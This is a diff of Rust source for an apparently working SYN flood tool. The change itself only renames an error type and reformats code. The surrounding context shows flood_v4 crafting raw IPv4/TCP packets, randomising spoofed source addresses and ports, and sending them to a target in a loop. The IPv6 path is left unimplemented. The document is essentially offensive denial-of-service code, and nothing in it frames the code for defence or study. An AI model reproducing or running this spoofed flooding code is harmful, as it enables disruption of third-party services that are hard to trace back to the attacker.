@@ -1,4 +1,4 @@
-use crate::error::SynFloodingError;
+use crate::error::SynFloodError;
 use crate::option::Opt;
 use crate::random::{random_global_ipv4_addr, random_source_port};
 use crate::runner::run;
@@ -21,11 +21,11 @@ use std::convert::TryInto;
 use std::net::{IpAddr, ToSocketAddrs};
 use std::net::{SocketAddr, SocketAddrV4, SocketAddrV6};
 
-pub fn resolve_destination(option: &Opt) -> Result<SocketAddr, SynFloodingError> {
+pub fn resolve_destination(option: &Opt) -> Result<SocketAddr, SynFloodError> {
     let addrs: Vec<_> = option
         .destination
         .to_socket_addrs()
-        .map_err(|e| SynFloodingError::ToSocketAddrs(option.destination.clone(), e))?
+        .map_err(|e| SynFloodError::ToSocketAddrs(option.destination.clone(), e))?
         .collect();
     addrs.iter().for_each(|addr| {
         info!(
@@ -52,17 +52,17 @@ pub fn resolve_destination(option: &Opt) -> Result<SocketAddr, SynFloodingError>
             }
         })
         .next()
-        .ok_or(SynFloodingError::NoSocketAddr)
+        .ok_or(SynFloodError::NoSocketAddr)
 }
 
-pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFloodingError> {
+pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFloodError> {
     let addr = socket_addr.ip();
     let port = socket_addr.port();
     let (mut sender, _) = transport_channel(
         opt.buffer_size,
         TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp),
     )
-    .map_err(SynFloodingError::TransportChannel)?;
+    .map_err(SynFloodError::TransportChannel)?;
 
     // create minimum IPv4 packet with minimum payload of TCP packet
     let ipv4_header_size = Ipv4Packet::minimum_packet_size();
@@ -81,7 +81,7 @@ pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFlooding
         v.resize(size, 0u8);
         v
     })
-    .ok_or(SynFloodingError::NewIpv4Packet)?;
+    .ok_or(SynFloodError::NewIpv4Packet)?;
     // construct main content of packets except part for spoofing
     ipv4_packet.set_version(4); // IP version 4
     ipv4_packet.set_header_length((ipv4_header_size / 4).try_into().unwrap());
@@ -99,8 +99,8 @@ pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFlooding
     debug!("basic IPv4 packet constructed: {:?}", ipv4_packet);
     {
         // create TCP packet of mutable reference of `[u8]` in IPv4 packet
-        let mut tcp_packet = MutableTcpPacket::new(ipv4_packet.payload_mut())
-            .ok_or(SynFloodingError::NewTcpPacket)?;
+        let mut tcp_packet =
+            MutableTcpPacket::new(ipv4_packet.payload_mut()).ok_or(SynFloodError::NewTcpPacket)?;
         // leave source port all zero
         tcp_packet.set_destination(port);
         // leave sequence number all zero
@@ -124,9 +124,9 @@ pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFlooding
                 .source_address
                 .map(|source| match source {
                     IpAddr::V4(source) => Ok(source),
-                    IpAddr::V6(source) => Err(SynFloodingError::Ipv4DestinationWithIpv6Source(
-                        *addr, source,
-                    )),
+                    IpAddr::V6(source) => {
+                        Err(SynFloodError::Ipv4DestinationWithIpv6Source(*addr, source))
+                    },
                 })
                 .transpose()?
                 .unwrap_or_else(|| random_global_ipv4_addr(&opt, &mut rng));
@@ -134,7 +134,7 @@ pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFlooding
             ipv4_packet.set_checksum(ipv4::checksum(&ipv4_packet.to_immutable()));
             {
                 let mut tcp_packet = MutableTcpPacket::new(ipv4_packet.payload_mut())
-                    .ok_or(SynFloodingError::NewTcpPacket)?;
+                    .ok_or(SynFloodError::NewTcpPacket)?;
                 let source_port = opt
                     .source_port
                     .unwrap_or_else(|| random_source_port(&opt, &mut rng));
@@ -154,7 +154,7 @@ pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFlooding
             );
             sender
                 .send_to(packet, IpAddr::V4(*addr))
-                .map_err(SynFloodingError::SendPacket)?; // ignore Ok result
+                .map_err(SynFloodError::SendPacket)?; // ignore Ok result
             Ok(())
         },
         |statistics| {
@@ -178,7 +178,7 @@ pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFlooding
     Ok(())
 }
 
-pub fn flood_v6(_option: &Opt, socket_addr: &SocketAddrV6) -> Result<(), SynFloodingError> {
+pub fn flood_v6(_option: &Opt, socket_addr: &SocketAddrV6) -> Result<(), SynFloodError> {
     let _addr = socket_addr.ip();
     let _port = socket_addr.port();
     unimplemented!()
